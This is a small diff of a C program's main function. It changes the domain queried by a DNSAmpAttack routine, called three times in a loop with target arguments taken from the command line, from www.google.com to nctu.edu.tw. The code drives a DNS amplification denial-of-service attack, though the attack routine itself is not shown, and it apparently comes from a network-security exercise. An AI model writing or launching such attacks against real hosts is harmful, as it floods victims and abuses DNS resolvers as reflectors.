@@ -14,7 +14,7 @@ int main(int argc, char** argv) {
     }
 
     for(int i = 0; i < 3; i++) {
-        DNSAmpAttack(argv[1], atoi(argv[2]), argv[3], "www.google.com");
+        DNSAmpAttack(argv[1], atoi(argv[2]), argv[3], "nctu.edu.tw");
         sleep(2);
     }
 
